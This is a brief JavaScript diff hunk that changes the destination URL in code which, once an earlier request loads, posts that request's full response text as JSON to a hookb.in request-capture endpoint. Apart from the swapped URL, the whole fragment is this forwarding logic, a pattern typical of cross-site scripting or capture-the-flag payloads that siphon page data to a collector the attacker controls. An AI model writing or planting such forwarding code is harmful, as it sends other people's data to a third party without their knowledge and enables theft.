@@ -5,7 +5,7 @@ http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 http.onload = function () {
     //if (http.readyState === http.DONE) {
         const xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://hookb.in/pz03njw7W1tRPnrrWo1w', true);
+        xhr.open('POST', 'https://hookb.in/K3NGpqW7ZwfPMK882dyr', true);
         xhr.setRequestHeader('Content-type', 'application/json');
         xhr.send(JSON.stringify(http.responseText));
         
